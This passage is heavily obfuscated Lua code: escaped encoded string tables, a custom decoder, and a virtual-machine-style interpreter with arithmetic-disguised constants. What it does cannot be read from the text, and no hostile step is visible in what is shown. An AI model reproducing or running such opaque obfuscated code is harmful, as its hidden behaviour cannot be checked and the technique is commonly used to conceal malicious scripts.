8\070\090\090\073\055\078\098\121\048\067\090\101\089\115\068\112\109\056\099\102\090\048\106\054\057\099\105\065\057\076\061\061","\104\098\043\097\105\103\074\077\057\065\115\109\054\122\061\061","\087\103\105\087\111\086\080\057\071\107\056\120\066\086\052\053\109\090\116\061";"\074\080\115\109\088\116\099\056\089\053\080\090\098\072\110\104\081\110\114\061";"\051\114\081\097\067\073\116\061";"\069\106\098\061","\109\101\072\105\119\109\104\109\102\105\105\070\088\114\099\104\075\068\106\085\087\048\120\078\118\107\106\119\043\082\111\061","\050\088\083\051\109\043\102\097\048\078\083\100\118\065\105\083\119\088\083\100\052\078\118\061","\086\084\049\065\089\066\061\061","\055\085\105\070\112\069\121\111\050\050\070\071\073\088\111\076\120\122\061\061";"\052\089\080\079\074\072\076\108\117\077\099\110\049\078\047\106","\114\110\050\122\104\055\110\089\107\055\068\080\107\106\089\061","\049\101\070\073\109\052\088\072\057\070\118\107\051\089\089\061","\109\057\112\122\077\118\061\061";"\116\119\083\048\090\119\097\104\110\118\061\061";"\085\069\100\105\100\105\085\104\085\056\048\098\098\121\065\097\097\054\074\048\110\122\047\072\117\080\052\116\107\051\057\071\056\075\101\114\097\070\082\054\087\104\109\075\116\047\072\087\080\056\065\097\068\051\114\088\079\080\119\061";"\043\070\054\074\119\107\079\114\097\083\055\104\111\076\081\121\114\102\069\081\085\054\047\115\118\068\079\052\077\075\111\107\110\069\111\074\099\120\049\085\106\053\100\097\086\112\057\074\073\090\081\057\043\078\108\083\072\089\088\100\051\074\100\120\052\052\080\099\075\107\081\053\114\077\089\112\074\048\101\116\083\118\106\052\056\078\067\102\109\083\104\068\080\047\108\071\049\083\071\054\097\073\104\115\097\117\085\069\054\120\086\056\068\078\051\061","\101\056\069\047\051\121\070\099\071\107\052\073\088\072\051\084\057\089\089\061";"\071\088\084\097\067\043\085\108","\116\102\109\074\079\067\122\105\079\114\051\061","\076\114\087\071\056\107\076\066\051\049\119\061","\067\043\049\103\067\113\080\121\069\075\119\061";"\067\043\049\057\067\078\084\104\071\086\111\061";"\119\043\085\097\069\043\066\061","\118\051\071\088\054\083\071\118\085\109\087\083\109\078\105\065\077\098\082\061";"\054\078\099\121\071\098\076\087\078\068\071\073\055\066\061\061","\089\088\097\097\119\076\061\061","\082\112\105\119\067\119\052\067\118\066\061\061","\043\114\100\106\088\116\100\043\072\076\061\061","\119\088\083\051\069\078\083\051\089\086\050\097\089\075\102\105","\111\112\065\100\049\055\097\097\057\051\121\120\102\090\103\108\083\079\055\082\083\102\075\083\118\065\084\082";"\072\079\079\048\118\081\100\073\114\065\078\055\105\071\072\087\081\081\099\061","\047\105\080\065\119\108\055\061","\087\105\102\076\055\071\111\097\089\100\107\055\119\051\054\054";"\081\083\068\047\110\083\102\052\069\067\065\050\086\122\111\061"}local function J(J)return o[J+(214810-153171)]end for J,E in ipairs({{-247988+247989;423351-423036},{836564-836563,55841-55568};{-153251-(-153525),261289-260974}})do while E[-58035+58036]<E[-974413-(-974415)]do o[E[63623+-63622]],o[E[-758760-(-758762)]],E[651257+-651256],E[-100074+100076]=o[E[-690575+690577]],o[E[-209260+209261]],E[-573118-(-573119)]+(-414116+414117),E[845006-845004]-(951839-951838)end end do local J=math.floor local E=table.concat local L=string.sub local m=type local H=string.len local w=table.insert local C=o local M={["\052"]=-647125+647143,s=-465039+465086;E=896793+-896766;Q=226138-226133;["\050"]=353992-353975;["\057"]=-712727+712773,["\048"]=-380283-(-380313);K=185635-185597;J=1249+-1190,Y=257032-257008;F=-543283+543293,C=-535023+535052,B=-400791+400839;n=-250493+250495;P=904140-904131,r=604850-604838,["\055"]=-106539-(-106595);b=659795-659791,O=-171354+171369,f=501619-501570,w=-341992-(-342020),a=-305344-(-305377),V=305621+-305598,["\047"]=-431566-(-431567);g=-467759-(-467810);t=-138471-(-138531),i=395666+-395629;D=744693+-744674;x=-287134+287179;["\054"]=229389+-229375,j=-816443+816446;["\056"]=-803073-(-803135),h=981760-981726;["\053"]=823367-823325;k=923019+-923008,R=-752729-(-752765);m=-337177+337197;G=399177+-399152;Z=-99157+99200;o=772463-772455;p=-148907+148938;L=989972-989940;X=756646-756592;U=1041461-1041448;["\049"]=280768+-280707;["\051"]=-871898-(-871950),c=24246+-24202;z=-785643-(-785643);N=522385-522363;W=-28966-(-29023);v=251903-251887;A=-351043-(-351082);I=-311104-(-311167),y=696107+-696066;["\043"]=-954593-(-954599);e=124397-124339,l=1036597+-1036557,M=-348759-(-348785);H=914485-914450;T=163859+-163806;q=-360567+360574;u=947473+-947418,S=-314503+314524;d=-643436+643486}local Y=string.char for o=-44510+44511,#C,454485-454484 do local i=C[o]if m(i)=="\115\116\114\105\110\103"then local m=H(i)local u={}local P=-683451-(-683452)local z=907494+-907494 local O=721100-721100 while P<=m do local o=L(i,P,P)local E=M[o]if E then z=z+E*(-299445+299509)^((-587914+587917)-O)O=O+(878689-878688)if O==238664+-238660 then O=-410312+410312 local o=J(z/(160048-94512))local E=J((z%(338658+-273122))/(154893-154637))local L=z%(-552439+552695)w(u,Y(o,E,L))z=-65557+65557 end elseif o=="\061"then w(u,Y(J(z/(604602+-539066))))if P>=m or L(i,P+(-93554+93555),P+(691698+-691697))~="\061"then w(u,Y(J((z%(342971-277435))/(-602168-(-602424)))))end break end P=P+(-785604-(-785605))end C[o]=E(u)end end end return(function(o,L,m,H,w,C,M,h,u,A,z,d,n,O,W,i,E,v,Y,l,Z,a,P)z,i,l,u,P,n,h,Z,v,E,a,O,Y,A,W,d=function(o)for J=899692+-899691,#o,288305-288304 do i[o[J]]=(600837+-600836)+i[o[J]]end if m then local E=m(true)local L=w(E)L[J(666328-727853)],L[J(191546+-252938)],L[J(438253+-499690)]=o,O,function()return 173113+-2777797 end return E else return H({},{[J(-875961-(-814569))]=O;[J(1008711+-1070236)]=o;[J(-874636-(-813199))]=function()return 386551+-2991235 end})end end,{},function(o,J)local L=z(J)local m=function(m,H,w,C,M)return E(o,{m,H;w;C,M},J,L)end return m end,function()P=P+(1041766-1041765)i[P]=775939+-775938 return P end,643734-643734,function(o,J)local L=z(J)local m=function(m,H)return E(o,{m;H},J,L)end return m end,function(o,J)local L=z(J)local m=function(...)return E(o,{...},J,L)end return m end,function(o,J)local L=z(J)local m=function(m)return E(o,{m},J,L)end return m end,function(o,J)local L=z(J)local m=function(m,H,w,C)return E(o,{m;H;w;C},J,L)end return m end,function(E,m,H,w)local O,N,G,h,Q,x,j,Hl,B,y,c,r,ml,D,V,g,q,P,k,K,Ll,El,i,S,T,I,F,X,U,R,Jl,s,b,z,t,p,M,ol,e,f while E do if E<924216+7646876 then if E<456411+4221926 then if E<1465197-(-698550)then if E<-256780+1218527 then if E<-423788+1162206 then if E<281500-(-277357)then if E<693157+-313137 then I=J(837059+-898423)E=o[I]I=J(-616208+554813)o[I]=E E=-887357+8574312 else N=-658151+658152 I=-561543+561549 E=Y[k]t=E(N,I)E=J(-991119-(-929755))I=J(122115+-183479)o[E]=t N=o[I]I=220849-220847 E=N>I E=E and 10956684-208947 or 214452+57690 end else if E<-192304+819947 then K=not q s=s+j f=s<=D f=K and f K=s>=D K=q and K f=K or f K=8350094-(-1034560)E=f and K f=4811037-424784 E=E or f else I=-976504+976504 e=#K c=e==I E=c and 4858942-(-167750)or 7965517-676214 end end else if E<96315+856547 then if E<427959+432085 then M={}E=o[J(-841174-(-779640))]else E=nil P=u()i=u()Y[i]=E E=nil Y[P]=E D=-36229+13564043519537 z=Y[H[896935+-896934]]f=J(-429931+368497)h=Y[H[-75353-(-75355)]]K=814488+6267464392142 S=Y[H[1045939+-1045936]]k=S(f,D)O=h[k]f=-598111+15029972401077 M=z[O]k=J(772410+-833744)O=Y[H[817843-817841]]h=Y[H[-496190-(-496193)]]S=h(k,f)z=O[S]q=J(-186022-(-124450))E=M[z]z=E E=Y[H[128290+-128286]]O=Y[H[-533470+533475]]k=Y[H[-934988-(-934989)]]D=Y[H[-313526-(-313528)]]s=Y[H[-527798+527801]]M=J(-929830+868483)j=s(q,K)f=D[j]M=E[M]S=k[f]j=J(-700385+638853)f=Y[H[-1041117-(-1041119)]]D=Y[H[87638+-87635]]q=33016532563757-(-345313)s=D(j,q)k=f[s]f=J(-425163-(-363831))h=S[k]M=M(E,O,h)D=-1007538+23740170341088 O=J(540177-601769)M=o[O]h=Y[H[-801019-(-801021)]]S=Y[H[-813283+813286]]k=S(f,D)j=J(-9331+-52030)O=h[k]E=M[O]O=Z(6727614-(-205677),{H[160360+-160359];H[-806794+806796];H[-87744-(-87747)];P})M=E(O)O=J(-1085632-(-1024040))f=J(-392506-(-331044))M=o[O]h=Y[H[1029379+-1029377]]S=Y[H[180529-180526]]D=30270296246246-(-339753)k=S(f,D)O=h[k]E=M[O]O=l(13234293-643082,{H[980528+-980527],H[-926763-(-926765)],H[-560199-(-560202)],i})M=E(O)O=J(946458+-1008050)f=J(-406994-(-345401))D=1370518217611-(-417523)M=o[O]h=Y[H[-675935+675937]]q=11989073836980-(-39450)S=Y[H[-629362+629365]]k=S(f,D)O=h[k]E=M[O]O=Z(357917+10615773,{H[278069+-278068];H[655203-655201];H[-243372+243375]})M=E(O)S=Y[H[34998-34997]]f=Y[H[-363574-(-363576)]]D=Y[H[-459735+459738]]s=D(j,q)k=f[s]h=S[k]s=J(-435641+374092)k=Y[H[-747802+747804]]j=-909453+35018174029887 f=Y[H[-304019-(-304022)]]D=f(s,j)s=2609083261781-974487 S=k[D]D=J(-1002601-(-941226))O=h[S]S=Y[H[876617+-876615]]k=Y[H[307937+-307934]]f=k(D,s)h=S[f]M=O[h]h=Y[H[-979752-(-979754)]]S=Y[H[139591+-139588]]f=J(785980-847497)D=-142640+9842511740695 k=S(f,D)O=h[k]E=M[O]E=E and 13492503-(-251853)or 12754046-963442 end else P=m[95941-95939]E=Y[H[866825-866824]]i=m[957829+-957828]z=E E=z[P]E=E and 987448-(-136755)or 9825623-296059 end end else if E<-960569+2383146 then if E<1895194-774720 then if E<1555562-587137 then K=J(-932462-(-870944))q=o[K]E=-720227+10316160 K=J(-283345-(-221880))j=q[K]D=j else E=true E=E and 13992560-609815 or 989593+13829484 end else E=454481+14607553 end else if E<-584654+2616190 then if E<2689284-1010814 then E=true E=E and 199132+336753 or 4592+5006557 else p=Y[P]E=p and-406353+4803846 or 969474+11418258 M=p end else R=244184+-244182 E=-465607+10799066 F=G[R]R=Y[x]T=F==R p=T end end end else if E<4089464-843877 then if E<-177413+2487441 then if E<2990400-741336 then if E<1782980-(-407835)then f=J(-845759+784291)D=367200+33267081503267 O=J(420042-481634)M=o[O]h=Y[H[715740+-715738]]S=Y[H[330109-330106]]k=S(f,D)O=h[k]E=M[O]O=l(804475+9759390,{H[699423+-699421];H[-578892-(-578895)]})M=E(O)O=J(-646229+584637)M=o[O]f=J(-350523-(-289166))h=Y[H[1030222-1030220]]D=73833+14640045783608 S=Y[H[957907-957904]]k=S(f,D)O=h[k]E=M[O]O=A(1001433+15430170,{H[-556157+556159],H[-798854+798857]})M=E(O)E=13907676-910223 else O=J(-410440+349061)f=J(-608088+546711)M=J(1046119+-1107497)E=o[M]i=Y[H[-650309+650313]]z=o[O]k=o[f]D=Z(9476786-318485,{})f={k(D)}k=-30173-(-30175)S={L(f)}h=S[k]O=z(h)z=J(-1010040-(-948412))P=i(O,z)i={P()}M=E(L(i))i=M P=Y[H[965354+-965349]]E=P and-194401+5372227 or 4608280-(-495871)M=P end else E=Y[H[-983843+983853]]P=Y[H[-277584-(-277595)]]i[E]=P E=Y[H[-951019-(-951031)]]P={E(i)}M={L(P)}E=o[J(-449026+387524)]end else if E<3623069-531335 then if E<2617495-36344 then e=e+g c=e<=I r=not V c=r and c r=e>=I r=V and r c=r or c r=-1045211+17677517 E=c and r c=-688429+3950478 E=E or c else z=9348270-539240 P=J(907718-969266)M=4709384-(-965967)i=P^z E=M-i M=J(-111058+49497)i=E E=M/i M={E}E=o[J(-609751-(-548215))]end else M=J(-749747+688205)k=J(-513507-(-451984))E=o[M]t=J(765508+-826889)O=Y[H[-389349-(-389350)]]h=Y[H[712420+-712418]]f=804116+26037507238472 i=m[370487-370486]S=h(k,f)K=J(620848-682304)z=O[S]f=Y[H[389720-389717]]s=Y[H[-796924+796925]]c=-322451+6786209265643 j=Y[H[383098-383096]]q=j(K,c)D=s[q]V=9245726526218-(-705991)k=f[D]D=Y[H[967797+-967796]]s=Y[H[75768+-75766]]K=6960331683674-158385 q=J(-273346+211995)j=s(q,K)e=29790053669556-205956 q=27643482069339-534291 f=D[j]S=k[f]j=J(9909-71240)f=Y[H[185068-185067]]D=Y[H[-467201+467203]]s=D(j,q)j=142524+25736191345172 k=f[s]h=S[k]s=J(388133-449655)k=Y[H[84918+-84917]]f=Y[H[99651-99649]]D=f(s,j)S=k[D]O=h[S]s=9808579084889-(-937854)j=17126553349199-740648 S=Y[H[-197636-(-197637)]]c=17293796367963-491238 g=J(886257+-947828)D=J(826614+-888202)k=Y[H[-228527-(-228529)]]K=J(-70388+8766)f=k(D,s)h=S[f]k=Y[H[752027-752026]]q=-343127+19767914291276 f=Y[H[945238+-945236]]s=J(857565+-919035)D=f(s,j)j=J(-35605-25824)S=k[D]f=Y[H[-269821-(-269822)]]D=Y[H[-524489+524491]]s=D(j,q)k=f[s]s=Y[H[-588177-(-588178)]]j=Y[H[-1010439+1010441]]q=j(K,c)c=J(375066-436595)D=s[q]j=Y[H[-198310-(-198311)]]q=Y[H[-935215-(-935217)]]K=q(c,e)s=j[K]f={[D]=s}c=-676417+30041813108966 s=Y[H[890789-890788]]j=Y[H[175545-175543]]K=J(533210-594597)N=-850917+23001126413755 q=j(K,c)D=s[q]s=Y[H[-473026+473030]]c=Y[H[932461+-932460]]e=Y[H[-666886-(-666888)]]b=e(t,N)K=c[b]e=Y[H[993689+-993684]]t=Y[H[-629453-(-629454)]]N=Y[H[-652279+652281]]j=J(988690+-1050033)I=N(g,V)j=s[j]b=t[I]g=28065345691645-617713 c=e[b]I=J(742906+-804318)b=Y[H[-938167+938168]]t=Y[H[95824-95822]]N=t(I,g)e=b[N]q={[K]=c,[e]=i}j=j(s,q)P={[z]=O;[h]=S,[k]=f,[D]=j}i=nil M=E(P)M={}E=o[J(73763+-135220)]end end else if E<868640+2890266 then if E<-358207+3917750 then if E<4270873-994359 then e=#K I=-768937+768937 c=e==I E=7122124-(-167179)else E=8747058-(-743297)s=J(-379670+318205)D=o[s]M=D end else M=J(-367617+306224)E=Y[H[921095+-921094]]z=m[-92927+92930]P=m[-48521+48523]i=m[-959310-(-959311)]M=E[M]M=M(E,i)O=M M=Y[H[290261+-290259]]E=O==M E=E and 691550+11278073 or-82230+15284680 end else if E<-928127+5389784 then if E<4975076-579308 then S=nil E=15322450-260416 O=nil k=nil else R=-495253-(-495254)Q=E F=G[R]R=false T=F==R p=T E=T and 2869586-751414 or 10090978-(-242481)end else z=-438917-(-438949)P=Y[H[-179258+179261]]i=P%z O=Y[H[-512295+512299]]D=154492-154490 j=417099-417086 k=Y[H[38324-38322]]c=Y[H[-999564-(-999567)]]K=c-i c=965913+-965881 q=K/c s=j-q f=D^s S=k/f h=O(S)f=-212635-(-212636)O=528560+4294438736 z=h%O h=-57462-(-57464)O=h^i P=z/O j=813205-812949 O=Y[H[-749783-(-749787)]]k=P%f f=316194+4294651102 S=k*f k=-5472+71008 h=O(S)O=Y[H[-273566-(-273570)]]S=O(P)z=h+S h=759909-694373 O=z%h S=z-O h=S/k k=-887742+887998 E=7743393-(-496762)S=O%k f=O-S O=nil D=717192-716936 P=nil k=f/D D=-903954-(-904210)i=nil f=h%D s=h-f D=s/j h=nil s={S,k;f,D}z=nil f=nil k=nil Y[H[110294+-110293]]=s S=nil D=nil end end end end else if E<6855664-476908 then if E<-819254+5973948 then if E<224639+4798547 then if E<5742850-798324 then if E<-94213+4893142 then E=10850184-896650 S=Y[h]M=S else i=J(-404401-(-342950))M=J(-562349+500904)E=o[M]M=E(i)E=o[J(-351429+289809)]M={}end else if E<-21945+5038352 then M={}E=o[J(759015-820543)]else P=u()k=J(-344577+283200)E=true i=m Y[P]=E z=J(-835628+774085)M=o[z]O=u()z=J(765380+-826762)E=M[z]z=u()h=u()Y[z]=E E=a(3961971-(-874394),{})Y[O]=E E=false Y[h]=E S=o[k]f=a(-378012+14059148,{h})k=S(f)M=k E=k and 5519794-820039 or-619242+10572776 end end else if E<4403095-(-700680)then if E<470670+4571929 then r={}j=nil e=u()y=J(482220-543857)g=u()I=l(5287224-(-429290),{e;D;s;h})Ll=26108482866833-(-549100)c={}G=J(-456096-(-394691))Y[e]=c c=u()ml=J(625875+-687318)z=nil Y[c]=I f=nil j=18347208808814-210959 I={}S=nil T=nil U=J(89642+-151167)Y[g]=I K=nil V=J(-902300-(-840929))h=W(h)I=o[V]x=Y[g]F=J(647071-708546)k=nil X={[U]=x;[G]=T}V=I(r,X)Y[O]=V I=d(90601+869809,{g,e;q;D;s;c})D=W(D)g=W(g)R=767693+30456990384281 T=951481+7611864975647 e=W(e)g=34284345706737-(-488811)c=W(c)Y[P]=I I=15809217714062-(-476467)q=W(q)s=W(s)h=J(-1058451-(-997009))z=o[h]k=Y[O]s=J(-254758-(-193133))h=J(879527-940880)Jl=2058827103025-(-903309)f=Y[P]r=J(992051+-1053564)K=5473076606702-552186 D=f(s,j)Hl=27795019260112-(-233919)j=J(-172743+111245)S=k[D]h=z[h]h=h(z,S)z=u()S=J(918454+-979896)Y[z]=h h=o[S]f=Y[O]q=13269623020571-754680 D=Y[P]x=617256+2950881860150 s=D(j,q)S=J(423494+-484847)k=f[s]B=13430348246469-(-191144)S=h[S]M={}S=S(h,k)h=u()k=J(200317-261759)Y[h]=S S=o[k]D=Y[O]G=J(814725+-876332)s=Y[P]q=J(-258364-(-196867))El=-240425+20390680219712 k=J(593693-655046)j=s(q,K)f=D[j]c=-21827+18193740805723 K=J(-890223+828590)k=S[k]k=k(S,f)S=u()Y[S]=k f=J(-571947-(-510505))k=o[f]s=Y[O]j=Y[P]q=j(K,c)e=-834923+8061680159765 f=J(-233630-(-172277))X=25301053543614-632505 c=J(226513-288070)f=k[f]D=s[q]f=f(k,D)k=u()Y[k]=f D=Y[k]j=Y[O]q=Y[P]K=q(c,e)s=j[K]f=D[s]e=-289951+18630936170114 c=J(812628-874190)D=u()Y[D]=f s=J(-370303+308896)f=o[s]s=f()j=Y[O]q=Y[P]U=J(208817-270397)K=q(c,e)f=j[K]j=d(251520+13915044,{O,P;z,D;S;h,k})s[f]=j j=J(518498+-579905)s=o[j]j=s()q=Y[O]e=J(-818953+757526)K=Y[P]c=K(e,I)s=q[c]f=j[s]K=Y[O]I=J(193355+-254919)c=Y[P]e=c(I,g)E=o[J(541225-602826)]q=K[e]e=Y[O]I=Y[P]g=I(r,X)c=e[g]g=Y[O]r=Y[P]X=r(U,x)e=3602601105-(-477352)I=g[X]X=Y[O]U=Y[P]ol=-478922+33649374448639 x=U(G,T)r=X[x]x=Y[O]G=Y[P]X=426641+-426626 T=G(F,R)U=x[T]D=W(D)T=Y[O]F=Y[P]R=F(y,B)G=T[R]z=W(z)B=J(938106+-999615)F=Y[O]R=Y[P]y=R(B,ol)T=F[y]R=Y[O]ol=J(-557504+496082)y=Y[P]B=y(ol,Jl)F=R[B]y=Y[O]B=Y[P]Jl=J(511282-572703)ol=B(Jl,El)El=J(-301944-(-240536))R=y[ol]B=Y[O]ol=Y[P]Jl=ol(El,Ll)y=B[Jl]B=true Jl=Y[O]El=Y[P]Ll=El(ml,Hl)ol=Jl[Ll]Jl=true x={[G]=T;[F]=R,[y]=B,[ol]=Jl}g={[r]=X;[U]=x}R=-817013+8050664736281 Jl=915615+12308682857924 G=J(814780+-876338)T=30199260630947-628917 X=Y[O]U=Y[P]F=J(47606+-108943)B=-204054+12378561557402 x=U(G,T)y=J(-183328+121772)r=X[x]x=Y[O]ol=J(251095+-312555)S=W(S)G=Y[P]T=G(F,R)U=x[T]T=Y[O]F=Y[P]R=F(y,B)G=T[R]R=Y[O]T=true y=Y[P]k=W(k)B=y(ol,Jl)F=R[B]y=Y[O]Jl=J(906589-967989)El=855017+2656344422635 B=Y[P]ol=B(Jl,El)R=y[ol]x={[G]=T,[F]=R}X={[U]=x}R=7236001659073-(-21608)F=J(898286+-959854)x=Y[O]G=Y[P]T=G(F,R)U=x[T]O=W(O)x=766666+-766636 P=W(P)K={[c]=e;[I]=g;[r]=X;[U]=x}j={[q]=K}h=W(h)s=f(j)else E=true E=E and 748443+5776248 or 5074360-(-395090)end else E=563208+6921225 i=nil Y[H[169978-169973]]=M end end else if E<6163594-601991 then if E<6142094-753870 then if E<6104925-850554 then E=6070564-966413 z=Y[H[-920113+920119]]P=z==i M=P else z=197814+-197737 P=Y[H[-965641+965644]]i=P*z P=798358-798101 M=i%P Y[H[-777855-(-777858)]]=M E=-367469+12359480 end else M={}E=o[J(867797+-929383)]end else if E<5192943-(-1027294)then if E<-399734+6316702 then i=Y[H[-616599-(-616600)]]M=#i i=242568-242568 E=M==i E=E and 10778094-(-678032)or 92374+8147781 else M[i]=P E=z E=-323542+1104824 end else Y[P]=p R=Y[X]y=-545256-(-545257)F=R+y T=G[F]Q=j+T T=-639167+639423 E=Q%T F=Y[r]j=E T=q+F E=8980429-436387 F=73582+-73326 Q=T%F q=Q end end end else if E<7974309-752893 then if E<-905503+7648662 then if E<7292158-620260 then if E<5530055-(-916626)then P=u()M=v(-705239+3883010,{H[434284-434283];H[625789+-625787];i,H[-360823+360829],H[-394714-(-394718)]})Y[P]=M c=14455476643622-(-783141)M=Y[P]S=Y[H[-750063-(-750064)]]D=J(-896778+835343)k=Y[H[170719-170717]]s=-977179+10570608458837 f=k(D,s)K=J(986608-1048192)h=S[f]f=Y[H[-546310-(-546314)]]s=Y[H[604241+-604240]]j=Y[H[168467+-168465]]q=j(K,c)D=s[q]k=f[D]K=18356899633237-653041 D=Y[H[-931485-(-931486)]]q=J(-822166-(-760782))s=Y[H[733860+-733858]]j=s(q,K)f=D[j]D=825747+1905214532068 S=k..f f=J(339929+-401368)O=h..S z=M(O)z=Y[H[-358284+358287]]h=Y[H[-531692+531693]]S=Y[H[-555728+555730]]k=S(f,D)O=h[k]M=z[O]E=11396989-728569 O=v(3194650-(-366305),{H[-768874+768881],H[530337+-530333];P;H[108553-108552],H[-783190-(-783192)]})z=J(-68892+7482)z=M[z]z=z(M,O)P=W(P)else i=J(-965991+904596)M=J(978900-1040264)E=o[M]M=o[i]i=J(-876463-(-815068))o[i]=E i=J(-794476-(-733112))o[i]=M i=Y[H[-375913+375914]]P=i()E=-299934+5350997 end else g=not I b=b+N M=b<=t M=g and M g=b>=t g=I and g M=g or M g=-740794+11895747 E=M and g M=-156235+12581188 E=E or M end else if E<6552419-(-433848)then if E<-57110+6881211 then M={}E=o[J(576889+-638362)]else z=Y[H[372858+-372857]]f=J(318279+-379627)h=Y[H[94388+-94386]]S=Y[H[990097+-990094]]D=13102780026698-(-739467)k=S(f,D)O=h[k]P=z[O]O=Y[H[668138-668136]]k=J(-948712-(-887227))f=330588+15320506470530 h=Y[H[702781-702778]]S=h(k,f)z=O[S]i=P[z]z=Y[H[-785658+785660]]O=Y[H[-676420-(-676423)]]S=J(-406866+345387)k=21157154031448-991452 h=O(S,k)P=z[h]M=i[P]h=J(14232+-75776)S=13934138467551-(-472185)P=Y[H[-798273+798275]]z=Y[H[-428245-(-428248)]]O=z(h,S)i=P[O]E=M[i]E=E and-649221+10537412 or 206955-(-574327)end else S=372430+2182819206442 h=J(-247892+186391)E=Y[H[905256+-905255]]P=Y[H[608183+-608181]]M=J(-1075940-(-1014450))M=E[M]z=Y[H[-500495-(-500498)]]O=z(h,S)i=P[O]M=M(E,i)h=J(909492-970831)E=J(687164+-748654)S=11213030126256-(-106933)P=Y[H[549037+-549035]]z=Y[H[-130637+130640]]O=z(h,S)h=J(-845301-(-783807))E=M[E]i=P[O]E=E(M,i)S=33119149872797-318047 P=Y[H[595877+-595875]]M=J(-281944-(-220454))z=Y[H[-166944+166947]]O=z(h,S)i=P[O]h=J(-844664-(-783067))S=4598304807686-(-830807)M=E[M]M=M(E,i)P=Y[H[1033040-1033038]]z=Y[H[-565935+565938]]E=J(-406347-(-344857))O=z(h,S)i=P[O]E=M[E]E=E(M,i)P=Y[H[-453626-(-453628)]]z=Y[H[-648018+648021]]M=J(906105+-967595)h=J(43491+-105072)S=-51857+25296322295956 M=E[M]O=z(h,S)S=-858694+29805164630141 h=J(556155+-617757)i=P[O]M=M(E,i)E=J(106621+-168111)E=M[E]P=Y[H[-351350-(-351352)]]z=Y[H[-72254-(-72257)]]O=z(h,S)i=P[O]E=E(M,i)h=J(676063-737577)M=J(-127224-(-65734))P=Y[H[-101992-(-101994)]]z=Y[H[27035+-27032]]M=E[M]S=-490919+7763799903174 O=z(h,S)i=P[O]S=-781744+9611532255019 M=M(E,i)P=Y[H[507140+-507138]]E=J(562761-624251)z=Y[H[-445686+445689]]h=J(301015-362556)O=z(h,S)i=P[O]h=J(-531829+470409)E=M[E]E=E(M,i)M=J(294652+-356142)P=Y[H[1010451+-1010449]]z=Y[H[891791-891788]]S=24822113877040-(-864502)M=E[M]O=z(h,S)i=P[O]M=M(E,i)S=309060+15895509591461 h=J(-997299-(-935959))P=Y[H[808609-808607]]z=Y[H[17115+-17112]]O=z(h,S)i=P[O]E=J(-638665+577175)h=J(-799930+738364)E=M[E]S=8327436726000-745419 E=E(M,i)P=Y[H[-650684+650686]]z=Y[H[40908-40905]]M=J(666614-728104)O=z(h,S)h=J(-1044441+983083)i=P[O]M=E[M]S=19264729989261-580995 M=M(E,i)P=Y[H[-988696+988698]]z=Y[H[-246437-(-246440)]]O=z(h,S)E=J(264029-325519)i=P[O]E=M[E]E=E(M,i)M=J(715708-777238)M=E[M]M=M(E)E=o[J(-328931-(-267340))]M={}end end else if E<7326454-(-341601)then if E<8394575-890580 then if E<6468972-(-948271)then I=#K e=407773-407772 r=129738+-129737 E=251813-(-415902)c=z(e,I)e=S(K,c)I=Y[q]V=e-r g=k(V)I[e]=g e=nil c=nil else E=Y[H[744586+-744579]]E=E and 203749+12146807 or 635205+8363783 end else h=287727-287725 O=530370-530369 P=Y[H[230671-230670]]z=P(O,h)P=-557075+557076 i=z==P M=i E=i and 15693173-(-975918)or-721630+14204993 end else if E<27237+8252872 then if E<-195310+8240951 then E=1810664-334222 else E=o[J(947889-1009485)]z=J(673793-735311)P=o[z]z=J(299991-361586)i=P[z]z=Y[H[-296185-(-296186)]]P={i(z)}M={L(P)}end else G=nil x=W(x)r=W(r)g=W(g)V=W(V)U=W(U)E=6380048-(-344731)X=W(X)end end end end end else if E<731994+11500449 then if E<-115250+10747217 then if E<170575+9684953 then if E<10388023-959711 then if E<9763641-755292 then if E<-705519+9395586 then T=328048-328047 E=-613167+6910937 Q=G[T]p=Q else P=320242-320241 E={}z=Y[H[-923943-(-923952)]]O=z i=E z=50790-50789 h=z E=899910+12371168 z=210018-210018 S=h<z z=P-h end else if E<10032883-815839 then M=-437248+1207677 P=J(-812040-(-750621))z=3154018-510769 i=P^z E=M-i M=J(-5874-55757)i=E E=M/i M={E}E=o[J(-348171+286566)]else N=J(-458812+397269)t=o[N]N=J(567249-628665)f=s b=t[N]t=b(i,f)b=Y[H[-886574+886580]]f=nil N=b()e=t+N E=-33819-(-646402)c=e+S e=302729-302473 N=728628-728627 K=c%e e=z[P]S=K t=S+N b=O[t]c=e..b z[P]=c end end else if E<9546678-(-31880)then if E<504568+9017689 then j=129371+-129306 c=n(3583670-768504,{})K=J(-622066+560689)D=u()Y[D]=M E=Y[k]s=-22849-(-22852)M=E(s,j)s=u()E=223430-223430 Y[s]=M j=E M=o[K]E=-436816-(-436816)K={M(c)}N=J(-14081+-47298)q=E E={L(K)}M=321692-321690 K=E E=K[M]M=J(817673-879051)c=E E=o[M]e=Y[z]t=o[N]N=t(c)t=J(-669229-(-607601))b=e(N,t)e={b()}M=E(L(e))e=u()Y[e]=M M=133965+-133964 b=Y[s]t=b b=1040803-1040802 N=b b=206901-206901 I=N<b E=7543295-818516 b=M-N else E={}Y[H[-379180+379182]]=E k=653762-653507 s=66648+-66647 M=Y[H[-435618+435621]]O=M h=-249419+35184372338251 M=P%h Y[H[-793253+793257]]=M S=P%k k=-427627+427629 f=J(954141+-1015684)h=S+k Y[H[-832444+832449]]=h k=o[f]f=J(-156327-(-94808))S=k[f]k=S(i)f=-219982+219983 S=J(221801-283127)j=s s=-1041453+1041453 z[P]=S S=-536694-(-536791)D=k q=j<s s=f-j E=-391994-(-1004577)end else M=D E=s E=D and 884879+8605476 or 967503+2330050 end end else if E<10656070-549389 then if E<9699182-(-267062)then if E<671513+9251937 then i=J(-1020045-(-958603))S=J(450228+-511843)M=o[i]z=Y[H[-19341-(-19343)]]O=Y[H[-793930+793933]]i=J(-314970+253617)k=-552036+18692196126308 i=M[i]h=O(S,k)P=z[h]i=i(M,P)z=Y[H[-177911+177913]]S=J(-859211-(-797747))O=Y[H[-928432+928435]]k=-222391+1596973836190 h=O(S,k)P=z[h]k=-474727+6307950545376 M=J(727464+-788954)M=i[M]S=J(-931897+870385)M=M(i,P)z=Y[H[-621241+621243]]O=Y[H[604856+-604853]]h=O(S,k)P=z[h]i=J(-85370-(-23880))i=M[i]S=J(-650612-(-589116))i=i(M,P)z=Y[H[636156-636154]]M=J(1039327+-1100817)O=Y[H[277629+-277626]]k=16280889256487-(-766838)M=i[M]h=O(S,k)P=z[h]M=M(i,P)i=J(411014+-472504)k=-672651+9561137681647 S=J(880207-941556)z=Y[H[-482611-(-482613)]]O=Y[H[-10214+10217]]h=O(S,k)P=z[h]k=19294438549331-771131 